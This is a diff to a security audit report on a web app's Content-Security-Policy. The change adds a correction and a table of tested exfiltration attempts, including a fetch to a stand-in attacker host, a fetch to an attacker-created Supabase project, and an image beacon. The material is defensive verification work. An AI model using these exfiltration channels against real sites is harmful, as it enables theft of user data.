@@ -505,11 +505,27 @@ you:
 4. **Whether the anon role currently holds SELECT on `property_engagement`.**
    The fix is grant-independent, but the pre-fix exposure window is not knowable
    from here.
-5. **Whether response headers are set.** GitHub Pages sets no CSP, HSTS,
-   `X-Frame-Options` or `Referrer-Policy`, and there is no `_headers` file in
-   the repository — so any such headers exist only as Cloudflare Transform
-   Rules I cannot see. **A CSP would have significantly blunted F-01/F-02**, and
-   remains the single highest-value defence-in-depth control still available.
+5. **Whether response headers are set.** GitHub Pages cannot set headers at
+   all, and there is no `_headers` file, so HSTS / `X-Frame-Options` /
+   `Referrer-Policy` exist only as Cloudflare rules I cannot see.
+
+   > **CORRECTION (2026-08-17, verification pass).** This section originally
+   > said Pintag had no CSP. That was wrong: all 22 HTML pages already carried
+   > a `<meta http-equiv="Content-Security-Policy">` tag, which the header-only
+   > grep used here missed. The substance still holds, but for a sharper
+   > reason — measured in Chromium against the real policy from `main`:
+   >
+   > | Exfiltration attempt | Old policy | New policy |
+   > |---|---|---|
+   > | `fetch('https://attacker.example/…')` | blocked | blocked |
+   > | `fetch('https://attackerproject.supabase.co/…')` | **ALLOWED** | blocked |
+   > | image beacon to an arbitrary host | **ALLOWED** (`img-src *`) | blocked |
+   >
+   > So the pre-existing CSP would **not** have contained F-01/F-02: `img-src *`
+   > is a complete exfiltration channel on its own, and
+   > `connect-src https://*.supabase.co` lets an attacker exfiltrate to a
+   > Supabase project they create in a minute. Both are closed by the policy
+   > shipped in the verification pass — see `docs/CSP.md`.
 6. **Whether MFA is actually enrolled** on the administrator account, and
    whether Supabase project-level MFA is enabled at all.
 
